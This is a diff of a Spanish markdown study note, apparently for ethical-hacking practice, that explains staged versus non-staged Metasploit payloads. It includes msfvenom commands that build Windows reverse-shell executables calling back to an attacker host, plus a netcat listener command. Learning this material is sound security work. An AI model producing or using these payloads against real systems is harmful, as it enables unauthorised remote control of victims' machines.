@@ -2,34 +2,87 @@
 tags:
   - Conceptos
 ---
-# Payload Staged
+# Tipos de Payloads
 
-**Payload Staged**: Es un tipo de payload que se **divide en dos** **o más etapas**. La primera etapa es una pequeña parte del código que se envía al objetivo, cuyo propósito es establecer una conexión segura entre el atacante y la máquina objetivo. Una vez que se establece la conexión, el atacante envía la segunda etapa del payload, que es la carga útil real del ataque. Este enfoque permite a los atacantes sortear medidas de seguridad adicionales, ya que la carga útil real no se envía hasta que se establece una conexión segura.
+Un payload es el código que se ejecuta en el sistema objetivo tras una explotación exitosa. En el contexto de Metasploit y msfvenom, los payloads se clasifican en dos categorías según cómo se entregan.
 
-## Creación:
+---
 
-Listener con metasploit
+## Payload Staged
+
+El payload se divide en **dos etapas**:
+
+1. **Stage 0 (stager):** código pequeño que se envía al objetivo. Su única función es establecer la conexión de vuelta al atacante.
+2. **Stage 1 (stage):** el payload real (p.ej. Meterpreter) que se descarga y ejecuta en memoria una vez establecida la conexión.
+
+**Ventaja:** el stager es pequeño y más fácil de inyectar en exploits con espacio limitado.  
+**Desventaja:** requiere que el atacante tenga un listener activo que sirva la segunda etapa.
+
+Se identifican en msfvenom por una barra `/` separando el tipo: `meterpreter/reverse_tcp`
+
+### Generación con msfvenom
 
 ```bash
-msfvenom -p windows/x64/meterpreter/reverse_tcp --platform Windows -a x64 LHOST=192.168.111.45 LPORT:4646 -f exe -o reverse.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+  --platform Windows -a x64 \
+  LHOST=<IP_ATACANTE> LPORT=4646 \
+  -f exe -o reverse.exe
 ```
+
+El listener debe ser Metasploit (`multi/handler`) para servir la segunda etapa correctamente.
+
+---
 
 ## Payload Non-Staged
 
-**Payload Non-Staged**: Es un tipo de payload que se envía como **una sola entidad** y **no se divide en múltiples etapas**. La carga útil completa se envía al objetivo en un solo paquete y se ejecuta inmediatamente después de ser recibida. Este enfoque es más simple que el Payload Staged, pero también es más fácil de detectar por los sistemas de seguridad, ya que se envía todo el código malicioso de una sola vez.
+El payload completo se envía en **un solo bloque**. No hay segunda etapa: todo el código malicioso viaja junto y se ejecuta en cuanto llega al objetivo.
 
-## Creación:
+**Ventaja:** más sencillo, compatible con listeners básicos como Netcat.  
+**Desventaja:** más fácil de detectar por AV/EDR al ser un bloque de código mayor.
 
-Listener con metasploit
+Se identifican en msfvenom con guión bajo: `shell_reverse_tcp`
+
+### Generación con msfvenom — listener Metasploit
 
 ```bash
-msfvenom -p windows/x64/meterprete_reverse_tcp --platform Windows -a x64 LHOST=192.168.111.45 LPORT:4646 -f exe -o shell.exe
+msfvenom -p windows/x64/meterpreter_reverse_tcp \
+  --platform Windows -a x64 \
+  LHOST=<IP_ATACANTE> LPORT=4646 \
+  -f exe -o shell_meterpreter.exe
 ```
 
-Listener con netcat:
+### Generación con msfvenom — listener Netcat
 
 ```bash
-msfvenom -p windows/x64/shell_reverse_tcp --platform Windows -a x64 LHOST=192.168.111.45 LPORT:4646 -f exe -o shell.exe
+msfvenom -p windows/x64/shell_reverse_tcp \
+  --platform Windows -a x64 \
+  LHOST=<IP_ATACANTE> LPORT=4646 \
+  -f exe -o shell_nc.exe
+```
+
+El listener en este caso puede ser simplemente:
+
+```bash
+nc -nlvp 4646
+```
+
+---
+
+## Staged vs Non-Staged — resumen
+
+| | Staged | Non-Staged |
+|---|---|---|
+| Tamaño inicial | Pequeño | Grande |
+| Listener requerido | Metasploit | Netcat o Metasploit |
+| Detección por AV | Más difícil | Más fácil |
+| Complejidad | Mayor | Menor |
+
+---
+
+## Referencias
+
+- [msfvenom cheatsheet — afsh4ck](https://afsh4ck.gitbook.io/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/msfvenom)
+
 ```
 
 https://afsh4ck.gitbook.io/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/msfvenom
